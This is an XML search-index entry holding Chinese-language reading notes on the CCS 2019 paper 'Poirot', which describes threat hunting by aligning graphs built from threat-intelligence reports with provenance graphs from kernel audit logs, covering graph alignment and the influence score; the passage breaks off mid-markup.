<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PaperNote-Poirot：对比攻击行为与内核审计记录以进行网络威胁猎杀</title>
      <link href="/2020/03/25/PaperNote-Poirot%EF%BC%9A%E5%AF%B9%E6%AF%94%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E4%B8%8E%E5%86%85%E6%A0%B8%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95%E4%BB%A5%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E7%8C%8E%E6%9D%80/"/>
      <url>/2020/03/25/PaperNote-Poirot%EF%BC%9A%E5%AF%B9%E6%AF%94%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E4%B8%8E%E5%86%85%E6%A0%B8%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95%E4%BB%A5%E8%BF%9B%E8%A1%8C%E7%BD%91%E7%BB%9C%E5%A8%81%E8%83%81%E7%8C%8E%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<p>原文标题：Poirot: Aligning Attack Behavior with Kernel Audit Records for Cyber Threat Hunting</p><p>原文作者：Sadegh M. Milajerdi，Birhanu Eshete，Rigel Gjomemo，V.N. Venkatakrishnan</p><p>原文来源：CCS 2019</p><p>原文链接：<a href="https://arxiv.org/pdf/1910.00056.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1910.00056.pdf</a></p><h1 id="1-摘要"><a class="markdownIt-Anchor" href="#1-摘要"></a> 1 摘要</h1><p>网络威胁情报（Cyber Threat Intelligence，<strong>CTI</strong>）：目前，信息安全业界普遍认同的一个理念是，仅仅防御是不够的，更加需要持续地检测与响应。而要做到更有效的检测与更快速的响应，安全情报必不可少。从防御者的角度来看，获取漏洞情报是为了知己，而获取威胁情报是为了知彼。</p><p>Gartner 对威胁情报 (TI) 的定义是：威胁情报产品和服务提供关于信息安全威胁和其他安全相关问题的知识。威胁情报可提供的信息包括<strong>攻击者的身份、动机、特征以及方法</strong>。这些信息来自技术工具（例如流量分析）和人员行动，例如对黑客和诈骗团伙的调查，以及与司法部门和行业组织的信息分享和协作。</p><p>与基于漏洞的防御思路不同，威胁情报面向新的威胁形式，它和大数据安全分析、基于攻击链的纵深防御等思想正在形成新一代的防御体系的基石。</p><p>网络威胁情报可以用来用来寻找攻击的<strong>Indicators</strong>。</p><p><strong>Misuse-based</strong>：本文使用kernel audits，将<strong>威胁猎杀</strong>（Threat Hunting）建模为一个非精确的<strong>图模式匹配</strong>（Graph Pattern Matching，GPM）问题。基于相似性度量，将由内核审计日志构建的provenance graph和由CTI关联构建的query graph进行比对。</p><p>评估实验使用DARPA数据集，结果表明，CTI关联可以用做威胁猎杀，并且具有鲁棒和可靠。</p><h1 id="2-简介"><a class="markdownIt-Anchor" href="#2-简介"></a> 2 简介</h1><p>威胁猎杀存在以下几个的挑战：</p><ul><li>搜索范围巨大</li><li>识别具有鲁棒性，并且能关联与攻击相关的实体</li><li>高效检测以做出及时响应</li></ul><p>为了促进CTI以<strong>IOC</strong>（<strong>Indicators of Compromise</strong>）形式进行交换，便于将攻击者的TTPs进行特征化描述，一些安全社区采用了<strong>OpenIOC</strong>、<strong>STIX</strong>、<strong>MISP</strong>等开放标准.为了提供更好的攻击概述，这些标准通常包含描述性关系，以显示indicators或observables如何相互关联。</p><p>本文从CTI报告和IOC描述中，将威胁猎杀问题形式化，开发了POIROT系统。该系统可以得到一个表示攻击成功可能性的分数。简而言之，给定一个用图表示的IOCs及其之间的关系（描述了APT），我们称之为<kbd>query graph</kbd>。然后在系统运行中产生的更大的provenance graph中寻找与其匹配的图。</p><h1 id="3-相关文献"><a class="markdownIt-Anchor" href="#3-相关文献"></a> 3 相关文献</h1><ul><li>基于日志的攻击分析</li></ul><p>DNS、web代理日志；网络流量；系统审计日志；</p><ul><li>探索Provenance Graph</li><li>查询处理系统（Query Processing Systems）</li></ul><p>现存的方法与POIROT正交，可以作为实现POIROT的基础</p><ul><li>行为发掘</li></ul><p>本文所使用的是<strong>图模式匹配</strong></p><ul><li>图模式匹配</li></ul><p>GPM可以被定义为一个搜索问题：在一个大图中搜索与某个特定图相匹配的子图，在许多案例中这是一个NPC问题</p><h1 id="4-方法概览"><a class="markdownIt-Anchor" href="#4-方法概览"></a> 4 方法概览</h1><p><img src="https://s1.ax1x.com/2020/03/28/GAb5DK.png" alt="" /></p><h2 id="41-provenance-graph-构建"><a class="markdownIt-Anchor" href="#41-provenance-graph-构建"></a> 4.1 Provenance Graph 构建</h2><p>Provence Graph特点：labeled、typed、directed</p><p>顶点表示实体，边表示信息流和因果关系。</p><p>POIROT支持从Windows、Linux、FreeBSD上收集审计日志，并在内存中构建Provenance Graph</p><h2 id="42-query-graph-构建"><a class="markdownIt-Anchor" href="#42-query-graph-构建"></a> 4.2 Query Graph 构建</h2><p>从CTI报告中提取与已知攻击相关的IOC和他们之间的关系。除自然语言之外，攻击还经常用结构化/半结构化的语言进行描述，如OpenIOC、STIX、MISP等。另外，也有工具可以从自然语言中自动提取IOCs，这些工具可以用来进行初始特征提取。</p><p>我们从CTI报告中建模的行为也是一个labeled、typed、directed的图，我们称之为<strong>query graph</strong>。在POIROT中，我们使用<strong>name</strong>和<strong>type</strong>（如processes、file、sockets、pipes）来指定query graph和provenance graph之间的映射。</p><ul><li>Query Graph 构建的一个例子：</li></ul><p>下面是恶意软件DeputyDog的分析报告摘要</p><p><img src="https://s1.ax1x.com/2020/03/28/GEpNZR.png" alt="" /></p><p>从中我们可以看出，描述subject所执行动作的动词，通常可以轻松地映射为从磁盘或网络进行读/写、以及到进程或进程之间的交互（例如，浏览器下载文件、进程产生另一个进程，用户单击鱼叉式钓鱼链接等）。</p><p>下图展示了与上述摘要对应的query graph：</p><p><img src="https://s1.ax1x.com/2020/03/28/GE95A1.png" alt="" /></p><p><strong>Query Graph是攻击图的一个总结</strong>。</p><h2 id="43-graph-alignment"><a class="markdownIt-Anchor" href="#43-graph-alignment"></a> 4.3 Graph Alignment</h2><p>最终，我们把威胁猎杀建模为：<strong>攻击的query graph是否在provenance graph中现身</strong>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>描述了实体之间的高级别关系，而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>描述了完整系统活动的低级别信息。这样就会出现，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的一条边对应<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的许多条边的情况，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中多出来的那些边很有可能是攻击者为了绕过检测而添加的噪声活动。因此，如何实现<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>之间的<strong>一一映射</strong>是至关重要的。</p><p>在精确匹配中，要求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的子图必须是重构的；但是在GPM中，放松了精确匹配的一些限制，以提取更多有用的子图；然而，两者都属于NPC问题。</p><p>现存的解决GPM的方法存在以下不足：</p><ul><li>并不是为labeled、typed图设计的</li><li>处理大规模图的能力不够</li><li>在比对过程中对所有节点进行比对</li><li>其目的不在于threat hunting</li></ul><p>首先，POIROT找到所有的候选比对集合i：j，其中i和j分别表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(G_q)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(G_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>中的节点。然后，从匹配可能性最高的比对（称为种子节点seed node）开始，扩大搜索范围以寻找其他节点比对。</p><p>采用影响分数（influence score）来评估这种可能性。根据攻击者产生流量所需的工作量来对flow进行优先级排序</p><p>当找到比对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>时，一个表述二者之间相似度的分数会被计算，如果分数超过阈值，就会引发警报，并且向分析人员报告比对节点和边以及时间戳；否则，POIROT从下一个候选种子节点继续比对。</p><h1 id="5-算法"><a class="markdownIt-Anchor" href="#5-算法"></a> 5 算法</h1><h2 id="51-alignment-metirc"><a class="markdownIt-Anchor" href="#51-alignment-metirc"></a> 5.1 Alignment Metirc</h2><p>下表介绍了一些概念，其中定义了两种类型的比对，即<strong>node alignment</strong>$和<strong>graph alignment</strong>。</p><p><img src="https://img-blog.csdnimg.cn/20200325201528429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><p>基于这些定义，那么当前的问题是要在众多的候选比对图中，找出最有可能的比对图。为了解决这个问题，考虑query和provenance graph<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，以及下图中两个可能的对比图：</p><p><img src="https://img-blog.csdnimg.cn/20200325201546738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></p><p>虚线表示<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">G_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>对应的子图，相同的标号表示与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>中的同一条边相对应。现在的问题就是，决定哪个比对图是最佳候选者。从图中可以直觉地看出，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><msub><mo stretchy="false">)</mo><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">(G_q::G_p)_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>比<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>G</mi><mi>q</mi></msub><mo>:</mo><mo>:</mo><msub><mi>G</mi><mi>p</mi></msub><msub><mo stretchy="false">)</mo><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">(G_q::G_p)_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>更加接近，因为其aligned nodes更多，而且其边也与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>G</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">G_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>更加一致。</p><h3 id="511-influence-score节点之间"><a class="markdownIt-Anchor" href="#511-influence-score节点之间"></a> 5.1.1 Influence Score（节点之间）</h3><ul><li>假设攻击者偏好简单的路径进行攻击（被攻击进程享有较少的祖先进程）</li><li>仅加载在一个进程中的攻击没有，在图中不会产生记录，因此难以检测。POIROT用来解决这个问题</li><li>攻击者可能用来增加噪音并逃避检测，但是其每项活动都可能具有相同的共同祖先，即攻击的初始危害点。因此，除非攻击者为执行更独特的危害付出了更高的成本，否则这种把戏无法改变Influence Score</li></ul><p>基于此，我们将节点<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 